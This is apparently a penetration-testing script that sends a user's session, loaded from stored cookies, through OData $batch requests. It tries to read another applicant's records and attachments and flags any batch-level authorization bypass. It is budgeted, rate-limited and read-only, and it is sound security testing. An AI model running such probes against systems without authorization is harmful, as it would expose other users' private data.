#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Track F — F1.3 — batch-wrap Sweep-2 cross-user reads.

Track B Sweep 2 wrapped Track-A 403 GET endpoints in $batch and saw outer
403 with no inner statuses. That result was reached with the BUGGY
_batch_body helper — batches got rejected at the parser layer, not
authz-checked. The verdict "no batch bypass" is a null result.

Re-run with the fixed helper (commit dfb7693). For each Track-A 403
endpoint keyed by B's applicationId or applicantId (a target A's session
should NOT be able to read directly), wrap the GET in a $batch and observe
the inner status.

  Direct A→B GET: 403 (Track A) or 400 (RubriekSet malformed)
  Batched inner 200 → cross-user READ via batch dispatch. Finding.
  Batched inner 403/400 → clean-negative (batch dispatch enforces same
                          read-authz as direct).

Endpoints (all with B's applicationId '000000503434'):
  GET Applications('000000503434')/SubmitChecks
  GET DisciplineSet?$filter=applicationId eq '000000503434'
  GET TrefwoordenSet?$filter=applicationId eq '000000503434'
  GET Applications('000000503434|0')/Attachments('1')/$value

Budget: 4 non-safe (each batch is POST /$batch even though inner is GET).
Under the 12 cap.

No writes — no cleanup needed.
"""
import argparse
import json
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import authz_matrix as m

ENDPOINTS = [
    "Applications('000000503434')/SubmitChecks",
    "DisciplineSet?$filter=applicationId eq '000000503434'",
    "TrefwoordenSet?$filter=applicationId eq '000000503434'",
    "Applications('000000503434|0')/Attachments('1')/$value",
]


def batched_get(client, session, rel_url, logger, note):
    """POST /$batch with a single GET sub-request (no changeset needed for
    GETs — SAP OData batches wrap reads outside changesets)."""
    body, boundary = m._batch_body([("GET", rel_url)])
    r = client.request(session, "POST", "$batch", body=body,
                       extra_headers={"Content-Type":
                                      f"multipart/mixed; boundary={boundary}"},
                       note=note)
    inners = m._parse_batch_inner_statuses(r.get("text", ""))
    inner = inners[0] if inners else None
    logger.log("f1.3", rel_url, "POST $batch(GET)", note, r,
               [f"outer={r.get('status')}", f"inner={inner}"])
    return r.get("status"), inner, r.get("text", "")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--dry-run", action="store_true")
    ap.add_argument("--min-interval", type=float, default=8.0)
    args = ap.parse_args()
    m.MIN_INTERVAL = args.min_interval
    print(f"[cadence] MIN_INTERVAL={m.MIN_INTERVAL}", file=sys.stderr)

    client = m.Client(dry_run=args.dry_run)
    logger = m.MatrixLogger(m.JSONL_PATH, dry_run=args.dry_run, append=True)

    if args.dry_run:
        sA = m.Session("A", "dry"); sA.csrf = "<dry>"
    else:
        sA = m.Session("A", m.load_cookie_header(m.CREDS_DIR + "/A.cookies"))
        client.fetch_csrf(sA)

    verdicts = []
    for rel in ENDPOINTS:
        note = f"F1.3 batch-wrap A→B {rel[:60]}"
        outer, inner, txt = batched_get(client, sA, rel, logger, note)
        anomaly = (inner == 200) and outer in (200, 202)
        flags = [f"outer={outer}", f"inner={inner}"]
        if anomaly:
            flags.append("ANOMALY_batch_read_authz_bypass")
        logger.log("f1.3", rel, "COMPARE", f"F1.3 verdict",
                   {"status": "n/a", "text": ""}, flags)
        verdicts.append((rel, outer, inner, anomaly))

    print("\n=== F1.3 SUMMARY ===", file=sys.stderr)
    any_hit = False
    for rel, outer, inner, anomaly in verdicts:
        marker = " ⚠ ANOMALY" if anomaly else ""
        any_hit = any_hit or anomaly
        print(f"  {rel[:60]:<60} outer={outer} inner={inner}{marker}",
              file=sys.stderr)
    print(f"\n[VERDICT] batch_read_authz_bypass={any_hit}", file=sys.stderr)
    return 0 if not any_hit else 1


if __name__ == "__main__":
    sys.exit(main())
